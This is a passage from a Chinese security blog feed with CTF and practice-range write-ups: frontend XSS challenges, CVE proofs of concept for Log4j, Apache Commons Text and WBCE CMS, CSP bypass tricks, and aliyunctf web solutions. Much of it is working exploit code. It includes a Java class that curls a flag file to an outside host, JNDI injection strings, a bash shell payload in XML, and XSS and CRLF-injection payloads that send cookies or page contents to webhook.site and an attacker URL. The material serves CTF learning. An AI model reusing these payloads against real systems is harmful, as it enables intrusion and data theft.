class="line">&#125;)</span><br></pre></td></tr></table></figure><p>在这一段因为req.path是可控的，但是如果输入尖括号等特殊符号会被url编码，导致无法利用，一般这种情况下就需要想想能不能让这个回显的内容加载进script标签中，或者直接让他进入js文件中<br>下面的payload，就可以让他加入js文件中<br><code>127.0.0.1:3000/1;var[Page]=[1];location=location.hash.slice(1)+document.cookie//..%2findex.xhtml#http://127.0.0.1:8000</code><br>将这段放到浏览器的时候，浏览器会把他当做目录为<br><code>1;var[Page]=[1];location=location.hash.slice(1)+document.cookie</code><br>文件名为<br><code>..%2findex.xhtml</code><br>去浏览<br><img src="/2023/09/06/%E5%89%8D%E7%AB%AFctf/1.png" alt><br>但是后端会去解析%2f也就是说后端会去返回直接index.xhtml<br>浏览器接收到以后会直接去解析index.xhtml中的内容<br>那么里面的main.js也会被请求为<br><code>http://127.0.0.1:3000/1;location=location.hash.slice(1)+document.cookie//main.js</code><br><img src="/2023/09/06/%E5%89%8D%E7%AB%AFctf/2.png" alt><br>因为开头的那段404代码会被uri所控制，所以就变成了<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Page</span> /<span class="number">1</span>;<span class="keyword">var</span>[<span class="title class_">Page</span>]=[<span class="number">1</span>];location=location.<span class="property">hash</span>.<span class="title function_">slice</span>(<span class="number">1</span>)+<span class="variable language_">document</span>.<span class="property">cookie</span><span class="comment">//main.js not found</span></span><br></pre></td></tr></table></figure><br><img src="/2023/09/06/%E5%89%8D%E7%AB%AFctf/3.png" alt><br>最后就直接跳转到#后面的url了</p><h3 id="intended"><a href="#intended" class="headerlink" title="intended"></a>intended</h3><ul><li>看到下面的代码，可以发现style标签下的尖括号是不会被转义的<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(<span class="string">&quot;&lt;div&gt;&lt;style&gt;a&lt;&lt;/style&gt;&lt;/div&gt;&quot;</span>)</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="comment">//&lt;div&gt;&lt;style&gt;a&lt;&lt;/style&gt;&lt;/div&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(<span class="string">&quot;&lt;svg&gt;aa&gt;&lt;/svg&gt;&quot;</span>)</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="comment">//&lt;svg&gt;aa&amp;gt;&lt;/svg&gt;</span></span><br></pre></td></tr></table></figure></li><li>base的用法<br>href中输入abc，那么之后的所有访问都会基于<a href="http://target/abc/">http://target/abc/</a><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;base href=<span class="string">&quot;/abc/&quot;</span>&gt;</span><br></pre></td></tr></table></figure></li></ul><p>接下来看到作者的payload<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;url&quot;</span>&gt;</span>https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750?<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    &lt;![CDATA[<span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-x</span>=<span class="string">&quot;]]＞&lt;/style&gt;</span></span></span><span class="language-xml"><span class="tag"><span class="string">&lt;iframe name=&#x27;Page&#x27; /&gt;</span></span></span><span class="language-xml"><span class="tag"><span class="string">&lt;base href=&#x27;/**/+location.assign(document.all.url.textContent+document.cookie)//&#x27; /&gt;</span></span></span><span class="language-xml"><span class="tag"><span class="string">&lt;style&gt;&lt;!--&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span>--&gt;<span class="tag">&lt;/<span class="name">style</span>&gt;</span></span>&lt;/div&gt;</span><br></pre></td></tr></table></figure><br>在xhtml中<code>&lt;![CDATA[XXXX]]&gt;</code>用于注释<br>利用xhtml和html的不同解析标准，在xhtml中就会变成下面这样<br><figure class="highlight xhtml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;url&quot;</span>&gt;</span>https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750?<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span>/*&lt;![CDATA[<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-x</span>=<span class="string">&quot;]]*/＞&lt;/style&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag">  &lt;iframe name=&#x27;Page&#x27; /&gt;&lt;base href=&#x27;/**/+location.assign(document.all.url.textContent+document.cookie)//&#x27; /&gt;&lt;style&gt;&lt;!--&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>--&gt;<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><br>跟unintended的思路一样，也是利用了会去加载其他js文件，且文件路径可控</p><h2 id="sekai-ctf-golf-jail"><a href="#sekai-ctf-golf-jail" class="headerlink" title="sekai ctf golf-jail"></a>sekai ctf golf-jail</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;持续更新一些国外的前端ctf，因为接触的前端偏少，这里就集中写一下wp&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="前端" scheme="http://example.com/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
    <category term="javascript" scheme="http://example.com/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜CVE</title>
    <link href="http://example.com/2023/08/27/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCVE/"/>
    <id>http://example.com/2023/08/27/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCVE/</id>
    <published>2023-08-27T03:45:45.000Z</published>
    <updated>2023-08-27T04:22:42.508Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE系列"><a href="#CVE系列" class="headerlink" title="CVE系列"></a>CVE系列</h1><p>不详细讲原理，只发一下poc<br><span id="more"></span></p><h2 id="CVE-2021-44228"><a href="#CVE-2021-44228" class="headerlink" title="CVE-2021-44228"></a>CVE-2021-44228</h2><p>log4j<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;curl -X POST -F xx=@/flag  http://xx：8999&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>先运行marshalsec<br><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://xx:8000/#Evil&quot; 1099</code></p><p>同时需要在8000端口起个web服务<br><code>python3 -m http.server 8000</code></p><p>要在8999端口起个nc，用于接受flag<br><code>nc -lvp 8999</code></p><p>输入框输入<br><code>$&#123;jndi:ldap://xx:1099/evil&#125;</code></p><p>不知道为什么不可以反弹shell，就直接用curl了</p><h2 id="CVE-2022-33980"><a href="#CVE-2022-33980" class="headerlink" title="CVE-2022-33980"></a>CVE-2022-33980</h2><p>payload<br><code>Url?url=http://xx:8000/test.xml&amp;data=path</code></p><p>test.xml<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span> ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">path</span>&gt;</span>$&#123;script:js:java.lang.Runtime.getRuntime().exec(&quot;bash -c &#123;xxx&#125;&quot;)&#125;<span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><br>直接弹shell</p><blockquote><p><code>$&#123;url:utf-8:file:///&#125;</code>可以用于读取目录<br><code>$&#123;url:utf-8:file:///flag&#125;</code>可以用于读取文件</p></blockquote><h2 id="CVE-2022-25101"><a href="#CVE-2022-25101" class="headerlink" title="CVE-2022-25101"></a>CVE-2022-25101</h2><p><a href="http://eci-2zec563boh9uafe744jn.cloudeci1.ichunqiu.com/admin/login/">http://eci-2zec563boh9uafe744jn.cloudeci1.ichunqiu.com/admin/login/</a><br><code>admin123456</code><br>进入后台<br><img src="/2023/08/27/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCVE/1.png" alt><br>install处选择一个压缩包，其中要有info.php，info.php写入你的payload即可<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$archive</span> = <span class="keyword">new</span> <span class="title class_">PclZip</span>(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// extract Add-on files into WBCE temp folder</span></span><br><span class="line"><span class="variable">$addon_root_path</span> = <span class="title function_ invoke__">find_addon_root_path</span>(<span class="variable">$archive</span>);</span><br><span class="line"><span class="variable">$list</span> = <span class="variable">$archive</span>-&gt;<span class="title function_ invoke__">extract</span>(</span><br><span class="line">    PCLZIP_OPT_PATH,</span><br><span class="line">    <span class="variable">$temp_unzip</span>,</span><br><span class="line">    PCLZIP_CB_PRE_EXTRACT,</span><br><span class="line">    <span class="string">&#x27;pclzip_extraction_filter&#x27;</span>,</span><br><span class="line">    PCLZIP_OPT_REPLACE_NEWER</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if uploaded file is a valid Add-On zip file</span></span><br><span class="line"><span class="keyword">if</span> (!(<span class="variable">$list</span> &amp;&amp; <span class="title function_ invoke__">file_exists</span>(<span class="variable">$temp_unzip</span> . <span class="string">&#x27;info.php&#x27;</span>))) &#123;</span><br><span class="line">    <span class="variable">$admin</span>-&gt;<span class="title function_ invoke__">print_error</span>(<span class="variable">$MESSAGE</span>[<span class="string">&#x27;GENERIC_INVALID_ADDON_FILE&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Include the templates info file</span></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$template_directory</span>);</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$theme_directory</span>);</span><br><span class="line"><span class="keyword">require</span>(<span class="variable">$temp_unzip</span> . <span class="string">&#x27;info.php&#x27;</span>);</span><br></pre></td></tr></table></figure><br>看看部分源码，可以看到他把压缩包的内容解压出来，然后require了info.php</p><h2 id="CVE-2021-44665"><a href="#CVE-2021-44665" class="headerlink" title="CVE-2021-44665"></a>CVE-2021-44665</h2><p>searchsploit相应的payload即可<br>把<br><code>../../database</code><br>改为<br><code>../../../../../../flag</code><br>即可<br>原理大概就是有一处insert的sql操作没有鉴权，可以用于添加相应的id，然后在getfile.php中可以获取到该id，绕过鉴权，并且他读取文件的操作没有过滤../，具体原理可以自行分析</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;CVE系列&quot;&gt;&lt;a href=&quot;#CVE系列&quot; class=&quot;headerlink&quot; title=&quot;CVE系列&quot;&gt;&lt;/a&gt;CVE系列&lt;/h1&gt;&lt;p&gt;不详细讲原理，只发一下poc&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="靶场" scheme="http://example.com/categories/%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="php" scheme="http://example.com/tags/php/"/>
    
    <category term="cve" scheme="http://example.com/tags/cve/"/>
    
    <category term="靶场" scheme="http://example.com/tags/%E9%9D%B6%E5%9C%BA/"/>
    
    <category term="sql" scheme="http://example.com/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>codeql</title>
    <link href="http://example.com/2023/08/06/codeql/"/>
    <id>http://example.com/2023/08/06/codeql/</id>
    <published>2023-08-06T08:49:35.000Z</published>
    <updated>2023-08-06T08:49:35.086Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>csp 策略及绕过</title>
    <link href="http://example.com/2023/07/20/csp-%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87/"/>
    <id>http://example.com/2023/07/20/csp-%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87/</id>
    <published>2023-07-20T03:44:40.000Z</published>
    <updated>2023-08-30T06:22:47.554Z</updated>
    
    <content type="html"><![CDATA[<h2 id="部分csp绕过方法"><a href="#部分csp绕过方法" class="headerlink" title="部分csp绕过方法"></a>部分csp绕过方法</h2><span id="more"></span><h3 id="unsafe-eval-？"><a href="#unsafe-eval-？" class="headerlink" title="unsafe-eval ？"></a>unsafe-eval ？</h3><p>csp策略<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &#x27;unsafe-eval&#x27; data: </span><br></pre></td></tr></table></figure><br>绕过代码<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><h3 id="CDN加载旧版js"><a href="#CDN加载旧版js" class="headerlink" title="CDN加载旧版js"></a>CDN加载旧版js</h3><p>csp策略<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src: https://cdnjs.cloudflare.com ;</span><br></pre></td></tr></table></figure><br>exp<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span>&gt;</span> &#123;&#123;&#x27;a&#x27;.constructor.prototype.charAt=[].join;$eval(&#x27;x=1&#125; &#125; &#125;;alert(1);//&#x27;);&#125;&#125; <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><h3 id="CRLF绕过"><a href="#CRLF绕过" class="headerlink" title="CRLF绕过"></a>CRLF绕过</h3><p>将csp策略挤到返回包的body中,记得注意content-length</p><h3 id="不完整script标签绕过"><a href="#不完整script标签绕过" class="headerlink" title="不完整script标签绕过"></a>不完整script标签绕过</h3><p>当浏览器碰到一个左尖括号时，会变成标签开始状态，然后会一直持续到碰到右尖括号为止，在其中的数据都会被当成标签名或者属性</p><p>csp<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">header</span>(<span class="string">&quot;X-XSS-Protection:0&quot;</span>);<span class="meta">?&gt;</span></span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Security-Policy&quot;</span> content=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;nonce-xxxxx&#x27;&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;xss&#x27;</span>]<span class="meta">?&gt;</span></span><br><span class="line">&lt;script nonce=<span class="string">&#x27;xxxxx&#x27;</span>&gt;<span class="comment">//do some thing</span></span><br><span class="line">&lt;/script&gt; </span><br></pre></td></tr></table></figure><br>exp<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="attr">data</span>:text/plain,<span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p><h3 id="iframe禁止js"><a href="#iframe禁止js" class="headerlink" title="iframe禁止js"></a>iframe禁止js</h3><ul><li>iframe标签可以设置csp，可以禁止掉某些前端过滤的js</li><li>如果页面A中有CSP限制，但是页面B中没有，同时A和B同源，那么就可以在A页面中包含B页面来绕过CSP</li></ul><h3 id="meta"><a href="#meta" class="headerlink" title="meta"></a>meta</h3><p>meta标签有一些不常用的功能有时候有奇效：<br>meta可以控制缓存（在header没有设置的情况下），有时候可以用来绕过CSP nonce。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;cache-control&quot;</span> content=<span class="string">&quot;public&quot;</span>&gt;</span><br></pre></td></tr></table></figure><br>meta可以设置Cookie（Firefox下），可以结合self-xss利用。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;Set-Cookie&quot;</span> <span class="title class_">Content</span>=<span class="string">&quot;cookievalue=xxx;expires=Wednesday,21-Oct-98 16:14:21 GMT; path=/&quot;</span>&gt;</span><br></pre></td></tr></table></figure></p><blockquote><p>还有更多可以参考下面的链接</p></blockquote><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass#unsafe-eval">https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass#unsafe-eval</a></li><li><a href="https://www.jianshu.com/p/f1de775bc43e">https://www.jianshu.com/p/f1de775bc43e</a></li><li><a href="https://cloud.tencent.com/developer/chapter/13541">https://cloud.tencent.com/developer/chapter/13541</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;部分csp绕过方法&quot;&gt;&lt;a href=&quot;#部分csp绕过方法&quot; class=&quot;headerlink&quot; title=&quot;部分csp绕过方法&quot;&gt;&lt;/a&gt;部分csp绕过方法&lt;/h2&gt;</summary>
    
    
    
    <category term="前端" scheme="http://example.com/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
    <category term="前端" scheme="http://example.com/tags/%E5%89%8D%E7%AB%AF/"/>
    
    <category term="js" scheme="http://example.com/tags/js/"/>
    
    <category term="csp" scheme="http://example.com/tags/csp/"/>
    
  </entry>
  
  <entry>
    <title>aliyunctf web</title>
    <link href="http://example.com/2023/04/26/aliyunctf-web/"/>
    <id>http://example.com/2023/04/26/aliyunctf-web/</id>
    <published>2023-04-26T03:18:44.000Z</published>
    <updated>2023-06-21T20:06:27.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ezBean"><a href="#ezBean" class="headerlink" title="ezBean"></a>ezBean</h2><span id="more"></span><p>这题本来做出来了，但是本地一直没复现成功（不知道是不是fastjson1.2.60版本的原因）也没想着直接去打poc，就错失了300分</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldname,Object value)</span><span class="keyword">throws</span></span><br><span class="line">            Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, String.valueOf(<span class="literal">true</span>));</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, String.valueOf(<span class="literal">true</span>));</span><br><span class="line">        <span class="type">JMXServiceURL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:rmi:///jndi/rmi://127.0.0.1:1099/el&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;URL: &quot;</span> + u + <span class="string">&quot;, connecting&quot;</span>);</span><br><span class="line">        <span class="type">RMIConnector</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnector</span>((JMXServiceURL)u, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">MyBean</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyBean</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;conn&quot;</span>,c);</span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">val</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">123</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">valfield</span> <span class="operator">=</span> val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        valfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        valfield.set(val, jsonArray);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        objectOutputStream.writeObject(val);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果用fastjson 1.2.60版本跑这个payload就会报<br>RMIConnector没有无参构造函数这个错误，搞得我想找平替RMIConnector的类，要满足以下三点</p><ul><li>有connect()函数</li><li>实现了JMXConnector接口</li><li>有无参构造的函数</li></ul><p>结果找了半天没找到<br>调用链如下，可以自己调试一下<br><code>BadAttributeValueExpException.readObject.toString -&gt; FastJSON -&gt; MyBean.getConnect -&gt; RMIConnector.connect -&gt; JNDI</code></p><h2 id="obsidian"><a href="#obsidian" class="headerlink" title="obsidian"></a>obsidian</h2><p>做题的时候一直以为是这个软件的rce，然后在那边绕过询问弹框，用<br><a href="https://forum.obsidian.md/t/possible-remote-code-execution-through-obsidian-uri-scheme/39743">https://forum.obsidian.md/t/possible-remote-code-execution-through-obsidian-uri-scheme/39743</a><br>这个poc去打rce，打的时候还一直在思考如果是这样搞的话，那为什么还需要xss➕绕过csp，结果最后还真的不是😂<br>当时还脑抽着想为什么他访问我的云服务器没有cookie</p><p>接下来开始分析，破解suffix就不说了</p><h3 id="crlf绕过csp加注入xss"><a href="#crlf绕过csp加注入xss" class="headerlink" title="crlf绕过csp加注入xss"></a>crlf绕过csp加注入xss</h3><p><img src="/2023/04/26/aliyunctf-web/1.png" alt><br>那么直接在nodeid后面加crlf注入，加xss就可以绕过csp，并且获得setcookie<br><code>http://比赛ip/note/123123%0d%0aA:B%0d%0a%0d%0a%3Cscript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E%0d%0a%0d%0a</code><br>上面的链接就可以进行弹窗，而且页面会显示<br><img src="/2023/04/26/aliyunctf-web/2.png" alt><br>就是因为crlf把他本来的http响应弄成response text了<br>那么接下来就很明了了<br><code>http://比赛/note/123123%0d%0aA:B%0d%0a%0d%0a%3Cscript%3Efetch(&#39;%2Fblog&#39;).then((response)%20%3D%3E%20response.text()).then((data)%20%3D%3Ebtoa(data)).then((data)%20%3D%3Elocation.replace(%60http%3A%2F%2F</code>+ip+<code>%3A99%2F%3Fdata%3D%24%7Bdata%7D%60))%3C%2Fscript%3E%0d%0a%0d%0a</code><br>通过js注入<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/blog&#x27;</span>)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">response</span>) =&gt;</span> response.<span class="title function_">text</span>())</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">data</span>) =&gt;</span> <span class="title function_">btoa</span>(data))</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">data</span>) =&gt;</span> location.<span class="title function_">replace</span>(<span class="string">`http://ATTACKER/?data=<span class="subst">$&#123;data&#125;</span>`</span>))</span><br></pre></td></tr></table></figure></p><h2 id="OOBdetection"><a href="#OOBdetection" class="headerlink" title="OOBdetection"></a>OOBdetection</h2><figure class="highlight python"><table><tr><td 